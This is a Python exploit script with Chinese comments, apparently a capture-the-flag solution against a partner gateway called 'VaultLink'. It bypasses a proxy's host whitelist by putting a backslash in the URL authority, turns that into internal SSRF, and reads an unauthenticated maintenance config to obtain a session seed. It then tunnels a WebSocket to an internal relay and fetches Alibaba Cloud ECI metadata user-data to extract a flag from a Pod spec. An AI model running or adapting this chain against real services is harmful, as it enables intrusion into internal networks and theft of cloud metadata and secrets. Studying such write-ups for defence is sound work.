#!/usr/bin/env python3
"""VaultLink 合作方网关利用脚本.

链: /api/proxy 的白名单只比对字符串, 校验侧在反斜杠处截断 authority,
    而连接侧把 \\ 并入 userinfo -> 白名单绕过成为任意内网 SSRF
    -> 127.0.0.1:31337/config (维护接口, 无鉴权) 拿 seed / relay_endpoint
    -> 经同一路径升级 WebSocket 到 127.0.0.1:8081/ws, IDENT 绑定会话
    -> 阿里云 ECI 元数据 100.100.100.200/latest/user-data
       -> base64 -d | gunzip -> Pod spec 的 ICQ_FLAG

用法:
    python exp.py --base http://TARGET
    python exp.py --base http://1.2.3.4:8080 --metadata 100.100.100.200
"""

import argparse
import base64
import gzip
import hashlib
import json
import os
import re
import socket
import struct
from urllib.parse import quote, urlparse

import requests

ALLOW = "rates.partner-forex.example.com"


def bypass_url(host, port, path):
    """校验侧取 \\ 之前的主机名命中白名单; 连接侧把 \\ 并入 userinfo, 实际连 host:port."""
    return "http://%s\\@%s:%d%s" % (ALLOW, host, port, path)


class Gateway:
    def __init__(self, base, timeout=15):
        parsed = urlparse(base if "://" in base else "http://" + base)
        self.scheme = parsed.scheme or "http"
        self.host = parsed.hostname
        self.port = parsed.port or (443 if self.scheme == "https" else 80)
        self.base = "%s://%s" % (self.scheme, parsed.netloc)
        self.timeout = timeout
        self.session = requests.Session()

    def proxy(self, host, port, path, **kwargs):
        response = self.session.get(
            self.base + "/api/proxy",
            params={"url": bypass_url(host, port, path)},
            timeout=self.timeout,
            **kwargs
        )
        return response

    def ws_connect(self, host, port, path):
        return RawWebSocket(self.host, self.port, self.scheme, bypass_url(host, port, path), self.timeout)


class RawWebSocket:
    """最小 WebSocket 客户端: 经 /api/proxy 升级, 帧自行收发."""

    def __init__(self, host, port, scheme, target_url, timeout=15):
        self.sock = socket.create_connection((host, port), timeout=timeout)
        self.sock.settimeout(timeout)
        self.buffer = bytearray()
        key = base64.b64encode(os.urandom(16)).decode()
        path = "/api/proxy?url=" + quote(target_url, safe="")
        request = (
            "GET %s HTTP/1.1\r\n"
            "Host: %s:%d\r\n"
            "Upgrade: websocket\r\n"
            "Connection: Upgrade\r\n"
            "Sec-WebSocket-Version: 13\r\n"
            "Sec-WebSocket-Key: %s\r\n"
            "\r\n" % (path, host, port, key)
        ).encode()
        self.sock.sendall(request)
        header = self._read_until(b"\r\n\r\n")
        status = header.split(b"\r\n", 1)[0]
        if b" 101 " not in status:
            raise RuntimeError("WebSocket 握手失败: %r" % status)
        expected = base64.b64encode(
            hashlib.sha1((key + "258EAFA5-E914-47DA-95CA-C5AB0DC85B11").encode()).digest()
        )
        if b"sec-websocket-accept: " + expected.lower() not in header.lower():
            raise RuntimeError("Sec-WebSocket-Accept 校验失败")

    def _read_until(self, marker):
        while marker not in self.buffer:
            data = self.sock.recv(4096)
            if not data:
                raise EOFError("握手期间连接关闭")
            self.buffer.extend(data)
        end = self.buffer.index(marker) + len(marker)
        result = bytes(self.buffer[:end])
        del self.buffer[:end]
        return result

    def _read_exact(self, count):
        while len(self.buffer) < count:
            data = self.sock.recv(max(4096, count - len(self.buffer)))
            if not data:
                raise EOFError("WebSocket 连接关闭")
            self.buffer.extend(data)
        result = bytes(self.buffer[:count])
        del self.buffer[:count]
        return result

    def send_frame(self, opcode, payload):
        mask = os.urandom(4)
        length = len(payload)
        if length < 126:
            header = bytes((0x80 | opcode, 0x80 | length))
        elif length < 65536:
            header = bytes((0x80 | opcode, 0x80 | 126)) + struct.pack("!H", length)
        else:
            header = bytes((0x80 | opcode, 0x80 | 127)) + struct.pack("!Q", length)
        masked = bytes(value ^ mask[index % 4] for index, value in enumerate(payload))
        self.sock.sendall(header + mask + masked)

    def send(self, message):
        self.send_frame(1, message.encode())

    def recv(self):
        fragments = []
        while True:
            first, second = self._read_exact(2)
            opcode = first & 0x0F
            length = second & 0x7F
            if length == 126:
                length = struct.unpack("!H", self._read_exact(2))[0]
            elif length == 127:
                length = struct.unpack("!Q", self._read_exact(8))[0]
            mask = self._read_exact(4) if second & 0x80 else None
            payload = self._read_exact(length)
            if mask:
                payload = bytes(value ^ mask[index % 4] for index, value in enumerate(payload))
            if opcode == 9:
                self.send_frame(10, payload)
                continue
            if opcode == 10:
                continue
            if opcode == 8:
                raise EOFError("服务端关闭 WebSocket: %r" % payload)
            fragments.append(payload)
            if first & 0x80:
                return b"".join(fragments).decode("utf-8", "replace")

    def close(self):
        try:
            self.send_frame(8, b"")
        except (OSError, EOFError):
            pass
        self.sock.close()


def decode_userdata(body):
    raw = base64.b64decode(body.strip())
    if raw[:2] == b"\x1f\x8b":
        raw = gzip.decompress(raw)
    return raw.decode("utf-8", "replace")


def main():
    parser = argparse.ArgumentParser(description="VaultLink gateway SSRF -> ECI metadata")
    parser.add_argument("--base", default="http://TARGET", help="合作方网关入口")
    parser.add_argument("--metadata", default="100.100.100.200", help="云元数据地址")
    parser.add_argument("--timeout", type=float, default=15.0)
    args = parser.parse_args()

    gw = Gateway(args.base, args.timeout)

    # 0) 对照: 直接访问回环应被白名单拦下
    control = gw.proxy("127.0.0.1", 31337, "/")
    print("[i] 对照请求 -> %d %s" % (control.status_code, control.text[:120].replace("\n", " ")))

    # 1) 绕过白名单读取维护接口
    config_resp = gw.proxy("127.0.0.1", 31337, "/config")
    if config_resp.status_code != 200:
        raise SystemExit("[-] /config 未打通: %d %s" % (config_resp.status_code, config_resp.text[:200]))
    match = re.search(r"\{.*\}", config_resp.text, re.S)
    config = json.loads(match.group(0)) if match else {}
    seed = config.get("vault_session_seed", "")
    relay = config.get("relay_endpoint", "")
    print("[+] 维护配置: seed=%s relay=%s" % (seed, relay))

    # 2) 同一绕过路径升级 WebSocket 到内部 relay, 按 SESSION 绑定会话
    if relay:
        rhost, rport = relay.split("/")[0].rsplit(":", 1)
        ws = gw.ws_connect(rhost, int(rport), "/ws")
        try:
            greeting = ws.recv()
            ready = ws.recv()
            print("[i] relay 问候: %s / %s" % (greeting, ready))
            if greeting.startswith("SESSION "):
                nonce = greeting.split(" ", 1)[1]
                ws.send("IDENT " + nonce)
                print("[+] " + ws.recv())
            ws.send("AUTH admin " + seed)
            print("[i] AUTH(预期被网关拦为 guest): " + ws.recv())
        finally:
            ws.close()

    # 3) 云元数据: ECI user-data 里的 Pod spec 携带 ICQ_FLAG
    meta = gw.proxy(args.metadata, 80, "/latest/user-data")
    print("[i] metadata -> %d, %d 字节" % (meta.status_code, len(meta.text)))
    try:
        spec = decode_userdata(meta.text)
    except Exception as exc:
        raise SystemExit("[-] user-data 解码失败: %s\n%s" % (exc, meta.text[:200]))

    match = re.search(r"ICQ_FLAG\s*[\r\n]+\s*value:\s*[\"']?([^\"'\s]+)", spec)
    if match:
        print("[+] flag: " + match.group(1))
    else:
        match = re.search(r"flag\{[^}]*\}", spec)
        if match:
            print("[+] flag: " + match.group(0))
        else:
            print("[-] Pod spec 中未找到 ICQ_FLAG; 原文片段:")
            print(spec[:2000])


if __name__ == "__main__":
    main()
